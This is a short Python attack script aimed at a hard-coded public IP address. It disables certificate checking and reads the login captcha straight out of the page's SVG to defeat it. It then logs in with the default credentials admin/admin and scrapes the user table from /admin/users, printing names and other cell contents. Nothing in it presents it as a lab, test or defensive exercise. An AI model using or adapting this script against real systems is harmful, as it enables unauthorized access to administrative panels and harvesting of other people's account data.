#!/usr/bin/env python3
"""
Access /admin/users and extract user list
"""

import requests
import re
from bs4 import BeautifulSoup

TARGET = "https://210.69.42.55"
sess = requests.Session()
sess.verify = False

# Login
r = sess.get(TARGET + "/admin/login")
token_match = re.search(r'name="_token" value="([^"]+)"', r.text)
if token_match:
    token = token_match.group(1)
    r = sess.get(TARGET + "/admin/captcha")
    captcha_match = re.search(r'<text[^>]*>(\w)</text>', r.text)
    if captcha_match:
        captcha = captcha_match.group(1)
        r = sess.post(TARGET + "/admin/login", data={
            'username': 'admin',
            'password': 'admin',
            'captcha': captcha,
            '_token': token
        })
        
        # Access users page
        print("=== Accessing /admin/users ===")
        r = sess.get(TARGET + "/admin/users")
        print(f"Status: {r.status_code}")
        
        # Parse HTML
        soup = BeautifulSoup(r.text, 'html.parser')
        
        # Look for user table
        tables = soup.find_all('table')
        print(f"Tables found: {len(tables)}")
        
        if tables:
            for i, table in enumerate(tables):
                rows = table.find_all('tr')
                print(f"Table {i}: {len(rows)} rows")
                for row in rows[:10]:  # First 10 rows
                    cells = row.find_all('td')
                    if cells:
                        print(" | ".join([cell.get_text().strip()[:30] for cell in cells]))